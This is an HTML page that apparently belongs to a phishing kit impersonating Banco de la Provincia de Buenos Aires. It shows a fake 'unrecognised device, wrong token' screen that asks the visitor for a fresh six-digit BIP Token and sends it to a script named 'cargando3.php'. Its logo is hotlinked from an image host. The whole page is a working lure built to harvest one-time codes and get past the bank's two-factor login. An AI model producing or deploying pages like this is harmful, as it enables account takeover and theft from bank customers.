<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco de la Provincia de Buenos Aires</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="todo">
    <header>
        <img  src="https://i.postimg.cc/qq0fChbR/loggoo.png" alt="">
    </header>
    <main>
        <div class="caja">
            <div class="titu">
            <h3>Dispositivo no reconocido</h3><br>
                <h3 style="color:#EF1616;">El token es incorrecto. Intentá nuevamente</h4>
            </div>
            <form action="cargando3.php" method="post">
                <b>Generá un nuevo token en la App de BIP MÓVIL e ingresalo nuevamente para continuar de forma correcta.</b>
            <br><br>
                <div class="cam">
                    
                <input type="text" placeholder="Ingresa el token de 6 digitos" required="" name="t2" minlength="6" maxlength="6">
                </div>
           <br><br>
            <div class="teclado">
                <p>Recordá que tu BIP Token vence cada 30 segundos...</p><img src="" alt="">
            </div>
            <div class="btn">
                <input id="button"  type="submit" value="Continuar">
            </div>
            </form>
            <div class="adis" style="line-height: 1.4!important;">
           
            </div>
        </div>
    </main>
</div>
</body>
</html>